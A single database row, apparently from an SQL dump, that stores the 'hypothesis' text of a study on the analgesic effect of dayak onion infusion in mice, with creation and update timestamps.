	(9627,263,'hypothesis','\"Changes in attitude of going back to nature as it is currently causing various impacts, one of which is the application to several medicinal plants. One of the medicinal plants still used by certain people until now is dayak onion. The purpose of this study was to analyze differences in effect of dayak onion infusion in mice and to know the effective consentration of dayak onion infusion as an analgesic. \"','2022-03-31 13:24:03','2022-03-31 13:24:03'),
